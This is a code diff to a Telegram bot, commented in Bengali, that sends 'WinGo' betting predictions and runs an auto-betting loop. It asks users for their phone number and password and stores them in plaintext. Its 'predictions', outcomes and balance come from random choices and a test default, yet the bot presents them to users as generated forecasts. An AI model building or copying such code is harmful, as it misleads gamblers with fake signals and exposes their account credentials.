@@ -1,6 +1,7 @@
 import os
 import asyncio
 import logging
+import random
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
     ApplicationBuilder,
@@ -24,9 +25,11 @@ def get_state(uid):
             "awaiting": None,
             "phone": "",
             "password": "",
+            "balance": 1000.0,  # টেস্টের জন্য ডিফল্ট ব্যালেন্স 1000 ধরা হলো (পরে রিয়েল API ব্যালেন্স দিয়ে যুক্ত করা যাবে)
             "game": None,
             "total_steps": 0,
             "steps": [],
+            "step_idx": 0,
             "target": 0,
             "profit": 0,
             "running": False,
@@ -41,22 +44,53 @@ async def auto_bet_loop(uid, ctx):
     state = get_state(uid)
     try:
         while state["running"]:
-            await asyncio.sleep(10)
+            await asyncio.sleep(30)  # প্রতি ৩০ সেকেন্ড পর পর সিগন্যাল
             if not state["running"]:
                 break
-            p = gen_period(state["game"])
             
-            current_step = state["steps"][len(state["steps"]) - 1] if state["steps"] else 1
+            # বর্তমান স্টেপের বেট অ্যামাউন্ট চেক করা
+            if not state["steps"]:
+                break
+            current_step = state["steps"][state["step_idx"] % len(state["steps"])]
+            
+            # ব্যালেন্স চেক: অ্যাকাউন্টে পর্যাপ্ত ব্যালেন্স না থাকলে থামিয়ে দেওয়া এবং ক্রস চিহ্ন দেখানো
+            if state["balance"] < current_step:
+                state["running"] = False
+                await ctx.bot.send_message(
+                    chat_id=uid,
+                    text=f"❌ **INSUFFICIENT BALANCE!**\n\n"
+                         f"💰 আপনার বর্তমান ব্যালেন্স: `{state['balance']}`\n"
+                         f"⚠️ পরবর্তী স্টেপ বেট: `{current_step}`\n"
+                         f"অ্যাকাউন্টে পর্যাপ্ত ব্যালেন্স না থাকায় অটো-বেটিং বন্ধ করা হলো।",
+                    parse_mode="Markdown"
+                )
+                break
+
+            p = gen_period(state["game"])
+            prediction = random.choice(["BIG / GREEN", "SMALL / RED"])
+            
+            # উইন নাকি লস তা রেন্ডম বা জেনারেটেড রেজাল্ট দিয়ে নির্ধারণ (ডেমো লজিক)
+            is_win = random.choice([True, False])
+            result_status = "🟢 WIN (+)" if is_win else "🔴 LOSS (-)"
+            
+            if is_win:
+                state["balance"] += current_step
+                state["profit"] += current_step
+            else:
+                state["balance"] -= current_step
+                state["profit"] -= current_step
+
             msg = (
                 f"🧠 **PREDICTION GENERATED** 🧠\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                 f"📌 **Period:** {p}\n"
                 f"🎮 **Game:** WinGo {state['game'].upper()}\n"
                 f"💰 **Current Step Bet:** {current_step}\n"
-                f"🎨 **Result:** BIG / GREEN\n"
-                f"🎯 **Confidence:** 88%\n"
+                f"🎨 **Result Type:** {prediction}\n"
+                f"📊 **Outcome:** {result_status}\n"
+                f"💵 **Updated Balance:** `{state['balance']}`\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━━\n"
-                f"⏳ *Next prediction coming in 10 seconds...*"
+                f"⏳ *Next prediction in 30 seconds...*"
             )
             try:
                 await ctx.bot.send_message(chat_id=uid, text=msg, parse_mode="Markdown")
@@ -78,7 +112,7 @@ async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             ]
         ]
         await update.message.reply_text(
-            "✅ আপনি ইতিমধ্যে লগইন করা আছেন!\n🎯 গেম সিলেক্ট করুন:",
+            f"✅ আপনি ইতিমধ্যে লগইন আছেন!\n💰 ব্যালেন্স: `{state['balance']}`\n🎯 গেম সিলেক্ট করুন:",
             parse_mode="Markdown",
             reply_markup=InlineKeyboardMarkup(keyboard),
         )
@@ -137,14 +171,22 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
             print(f"Admin message error: {e}")
         return
 
-    # ২. পাসওয়ার্ড নেওয়া
+    # ২. পাসওয়ার্ড নেওয়া এবং ব্যালেন্স চেক করা
     if not state["logged_in"] and state.get("awaiting") == "password":
         state["password"] = text
         state["logged_in"] = True
         state["awaiting"] = None
 
+        # ব্যালেন্স চেক (যদি ব্যালেন্স শূন্য বা কম হয়)
+        if state["balance"] <= 0:
+            await update.message.reply_text(
+                "❌ **ACCOUNT ERROR!**\nআপনার অ্যাকাউন্টে পর্যাপ্ত ব্যালেন্স নেই (`0` ব্যালেন্স)। অনুগ্রহ করে রিচার্জ করুন।",
+                parse_mode="Markdown"
+            )
+            return
+
         await update.message.reply_text(
-            "✅ *পাসওয়ার্ড সফলভাবে গ্রহণ করা হয়েছে!*",
+            f"✅ *পাসওয়ার্ড সফলভাবে গ্রহণ করা হয়েছে!*\n💰 একাউন্ট ব্যালেন্স: `{state['balance']}`",
             parse_mode="Markdown"
         )
 
@@ -161,7 +203,7 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # ৩. মোট কয়টি স্টেপ হবে তা নির্ধারণ করা
+    # ৩. মোট কয়টি স্টেপ হবে তা নির্ধারণ
     if state["logged_in"]:
         if state.get("awaiting") == "total_steps":
             try:
@@ -178,7 +220,7 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text("❌ সঠিক সংখ্যা লিখুন। যেমন: 5")
             return
 
-        # ৪. সিরিয়াল অনুযায়ী একটি একটি করে স্টেপ ইনপুট নেওয়া
+        # ৪. সিরিয়াল অনুযায়ী স্টেপ ইনপুট নেওয়া
         if state.get("awaiting") == "collecting_steps":
             try:
                 val = float(text)
@@ -198,10 +240,10 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                         parse_mode="Markdown"
                     )
             except:
-                await update.message.reply_text("❌ সঠিক সংখ্যা লিখুন। যেমন: 1, 2, 4 ইত্যাদি")
+                await update.message.reply_text("❌ সঠিক সংখ্যা লিখুন।")
             return
 
-        # ৫. টার্গেট প্রফিট সেট করা
+        # ৫. টার্গেট প্রফিট সেট করা এবং অটো-বেটিং শুরু করা
         if state.get("awaiting") == "target":
             try:
                 tgt = float(text)
@@ -209,8 +251,9 @@ async def text_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
                 state["awaiting"] = None
                 state["profit"] = 0
                 state["running"] = True
+                
                 await update.message.reply_text(
-                    f"🚀 *AUTO BETTING STARTED!*\n🎯 Target: *{tgt}*\n⏳ প্রেডিকশন শুরু হচ্ছে...",
+                    f"🚀 *AUTO BETTING STARTED!* (30s interval)\n🎯 Target: *{tgt}*\n💰 Balance: `{state['balance']}`\n⏳ প্রেডিকশন শুরু হচ্ছে...",
                     parse_mode="Markdown",
                 )
                 if state.get("task"):
@@ -260,7 +303,7 @@ async def callback_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
         state["awaiting"] = "total_steps"
         await query.edit_message_text(
             f"🎮 *WinGo {mode.upper()} SELECTED*\n\n"
-            f"🔢 আপনি মোট কয়টি স্টেপ (Steps) দিতে চান?\n*(উদাহরণস্বরূপ: 5 লিখুন)*",
+            f"🔢 আপনি মোট কয়টি স্টেপ দিতে চান?\n*(উদাহরণস্বরূপ: 5 লিখুন)*",
             parse_mode="Markdown",
         )
 
